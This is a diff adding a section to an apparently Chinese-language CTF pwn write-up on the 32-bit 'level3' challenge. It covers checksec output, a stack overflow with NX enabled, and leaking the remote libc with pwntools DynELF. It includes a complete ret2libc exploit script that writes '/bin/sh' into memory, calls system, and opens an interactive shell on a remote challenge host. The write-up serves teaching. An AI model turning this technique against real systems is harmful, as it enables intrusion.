@@ -401,6 +401,105 @@ if __name__ == '__main__':
 
 
 
+## 0x23 level3 && leak the version of remote libc
+
+这道题，只给出了 `elf` 文件并没有给出 `libc` 。
+
+日常 `checksec` ：
+
+```sh
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+### 程序分析
+
+`main` 函数调用了 `vulnerable_function` 。
+
+![level3_flow_chart](/image/2019-04-03-linux_pwn_stack/level3_flow_chart.png)
+
+`vulnerable_function` 有一个很明显的栈溢出漏洞，但是这里开启了 `NX` 没有办法写 `shellcode` 。
+
+#### leak the version of remote libc
+
+很多的题目为了降低难度，很多通过调用库函数 `system` 的题目我们实际上都故意留了后门或者提供了目标系统的  `libc` 版本。我们知道，不同版本的 `libc` ，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致。所以如果题目不提供 `libc` ，通过泄露任意一个库函数地址计算出 `system` 函数地址的方法就不好使了。这就要求我们想办法获取目标系统的 `libc` 。
+
+`pwntools` 提供了一个方法 `DynELF` 可以泄露 `libc` 的版本，具体的用法在 [**这**](https://pwntools.readthedocs.io/en/stable/dynelf.html) 。
+
+### 漏洞利用
+
+`poc` :
+
+```python
+#! /usr/bin/env python
+# -*- coding:utf-8 -*-
+from pwn import *
+
+
+debug = 0
+if debug:
+    exp_file = process('./level3')
+else:
+    exp_file = remote("111.198.29.45", 30223)
+
+elf_file = ELF('./level3')
+
+
+def leak(leak_addr):
+    _start_addr = elf_file.symbols['_start']
+    write_got = elf_file.plt['write']
+    exp_file.recvuntil("Input:\n")
+    payload = "a" * 0x8c
+    payload += p32(write_got)
+    payload += p32(_start_addr)
+    payload += p32(0x1)
+    payload += p32(leak_addr)
+    payload += p32(0x4)
+    exp_file.sendline(payload)
+    get_leak_addr = exp_file.recv(4)
+    log.info("{addr_1}: {addr_2}".format(addr_1=hex(leak_addr), addr_2=hex(u32(get_leak_addr))))
+    return get_leak_addr
+
+
+def write_bin_sh(hello_addr):
+    _start_addr = elf_file.symbols['_start']
+    read_plt = elf_file.plt['read']
+    exp_file.recvuntil("Input:\n")
+    payload = "a" * 0x8c
+    payload += p32(read_plt)
+    payload += p32(_start_addr)
+    payload += p32(0x0)
+    payload += p32(hello_addr)
+    payload += p32(0x100)
+    exp_file.sendline(payload)
+    exp_file.sendline("/bin/sh; ")
+
+
+def main():
+    d = DynELF(leak, elf=elf_file)
+    system_addr = d.lookup("system", "libc")
+    data_addr = 0x0804A01C
+    write_bin_sh(data_addr)
+
+    _start_addr = elf_file.symbols['_start']
+    exp_file.recvuntil("Input:\n")
+    payload = "a" * 0x8c
+    payload += p32(system_addr)
+    payload += p32(_start_addr)
+    payload += p32(data_addr)
+    exp_file.sendline(payload)
+    exp_file.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
+
 # 未完待续。。。
 
 未完待续。。。
